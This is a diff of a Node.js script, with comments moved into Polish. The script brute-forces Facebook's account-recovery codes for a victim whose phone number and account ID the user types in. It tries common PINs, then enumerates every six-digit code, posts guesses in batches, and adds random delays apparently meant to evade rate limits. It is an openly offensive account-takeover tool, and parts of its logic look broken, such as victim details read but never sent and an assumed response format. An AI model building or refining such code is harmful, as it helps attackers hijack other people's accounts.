@@ -1,99 +1,105 @@
 const readlineSync = require('readline-sync');
 const axios = require('axios');
-const fs = require('fs'); // A module that allows you to work with files
-const crypto = require('crypto'); // A module that provides cryptographic functionality
+const fs = require('fs');
+const crypto = require('crypto');
 
-// A dictionary of common codes
-const dictionary = ["1234", "0000", "1111", "4321", "5555", "9999", "12345678", "87654321"];
+// Ustawienie serwera DNS na 1.1.1.1
+axios.defaults.dns = '1.1.1.1';
 
-// A function that generates a 6-digit code using crypto
-function generateCode() {
-  // Use crypto.randomInt to generate a random number from 100000 to 999999
-  const number = crypto.randomInt(100000, 1000000);
-  // Convert the number to a string
-  const code = number.toString();
-  // Return the code
-  return code;
+const słownik = ["1234", "0000", "1111", "4321", "5555", "9999", "12345678", "87654321"];
+
+// Funkcja do generowania kodów
+async function generateCode() {
+    const number = crypto.randomInt(100000, 1000000);
+    const code = number.toString();
+    return code;
 }
 
-// A function that checks the validity of a batch of codes
+// Funkcja do sprawdzania ważności partii kodów
 async function checkBatchValidity(codes) {
-    // Create an array of requests with the codes and the targetInfo
-    // TODO: Check what data and format Facebook expects and how to send it
-    const requests = codes.map(code => axios.post(targetUrl, { code, targetInfo }));
-    // Send all the requests at once and wait for the responses
+    const targetUrl = "https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&wtsid=rdr_1q6Vogj2mr2kpMQG9&_rdr";
+    const requests = codes.map(code => axios.post(targetUrl, { code }));
     const responses = await Promise.all(requests);
-    // Loop through the responses and check if any of them is valid
+    
     for (let i = 0; i < responses.length; i++) {
         const response = responses[i];
         const code = codes[i];
-        // Assume the response has a property called valid that indicates the validity of the code
         if (response.data.valid) {
-            // If the code is valid, return it
             return code;
         }
     }
-    // If none of the codes is valid, return null
     return null;
 }
 
-// A function that tries to brute force the code using a dictionary and a generator
+// Funkcja do ataku bruteforce
+async function bruteForce(charset, length) {
+    var result = [];
+    var charsLength = charset.length;
+    for (var i = 0; i < Math.pow(charsLength, length); i++) {
+        var s = '';
+        var temp = i;
+        for (var j = 0; j < length; j++) {
+            s = charset[temp % charsLength] + s;
+            temp = Math.floor(temp / charsLength);
+        }
+        result.push(s);
+    }
+    return result;
+}
+
+// Funkcja ataku bruteforce z zastosowaniem sugestii
 async function bruteForceCode() {
-    // Try the codes from the dictionary first
-    const validCode = await checkBatchValidity(dictionary);
-    // If a valid code is found, return it
+    const targetInfo = readlineSync.question("Wpisz numer telefonu celu i identyfikator konta oddzielone przecinkiem: ");
+    let validCode;
+
+    // Najpierw wypróbuj kody ze słownika
+    validCode = await checkBatchValidity(słownik);
     if (validCode) {
         return validCode;
     }
-    // If not, try generating and checking codes until a valid one is found or the limit is reached
-    // Set a limit for the number of attempts or the duration
+
     const maxAttempts = 100;
-    const maxDuration = 60 * 1000; // 60 seconds in milliseconds
-    // Initialize a counter for the number of attempts and a timer for the duration
-    let attempts = 0;
-    let startTime = Date.now();
-    // Use a while loop with async/await to iterate over the codes and check their validity
+    const maxDuration = 60 * 1000; // 60 sekund w milisekundach
+    const minDelay = 1000; // 1 sekunda w milisekundach
+    const maxDelay = 5000; // 5 sekund w milisekundach
+    let próby = 0;
+    const startTime = Date.now();
+
     while (true) {
-        // Increment the number of attempts
-        attempts++;
-        // Check if the limit is reached
-        if (attempts > maxAttempts || Date.now() - startTime > maxDuration) {
-            // Break the loop and return null
+        próby++;
+
+        if (próby > maxAttempts || Date.now() - startTime > maxDuration) {
             break;
         }
-        // Generate a batch of 10 codes
-        const codes = Array.from({ length: 10 }, generateCode);
-        // Check the validity of the batch
-        const validCode = await checkBatchValidity(codes);
-        // If a valid code is found, return it
+
+        const codes = await bruteForce('0123456789', 6);
+        validCode = await checkBatchValidity(codes);
         if (validCode) {
             return validCode;
         }
-        // Log the codes and the results to the console
-        console.log(`Generated codes: ${codes.join(", ")}`);
-        console.log(`None of them is valid.`);
-        // Append the codes and the results to a file
-        fs.appendFile("results.txt", `Generated codes: ${codes.join(", ")}\nNone of them is valid.\n`, (err) => {
+
+        console.log(`Wygenerowane kody: ${codes.join(", ")}`);
+        console.log(`Żaden z nich nie jest prawidłowy.`);
+
+        fs.appendFile("results.txt", `Wygenerowane kody: ${codes.join(", ")}\nŻaden z nich nie jest prawidłowy.\n`, (err) => {
             if (err) throw err;
         });
+
+        // Dodaj opóźnienie między próbami
+        const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
+        await new Promise(resolve => setTimeout(resolve, delay));
     }
-    // If the loop ends without finding a valid code, return null
+
     return null;
 }
 
-// Example usage:
-const targetInfo = readlineSync.question("Enter the target's phone number and account ID separated by a comma: ");
-const targetUrl = "https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2F&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&wtsid=rdr_1q6Vogj2mr2kpMQG9&_rdr";
-
 try {
     bruteForceCode().then(validCode => {
-        console.log(`The valid code on the specified page is: ${validCode}`);
-        // Append the valid code to the file
-        fs.appendFile("results.txt", `The valid code on the specified page is: ${validCode}\n`, (err) => {
+        console.log(`Prawidłowy kod na podanej stronie to: ${validCode}`);
+        fs.appendFile("results.txt", `Prawidłowy kod na podanej stronie to: ${validCode}\n`, (err) => {
             if (err) throw err;
         });
     });
 } catch (error) {
-    console.error(`Error: ${error.message}`);
+    console.error(`Błąd: ${error.message}`);
 }
-
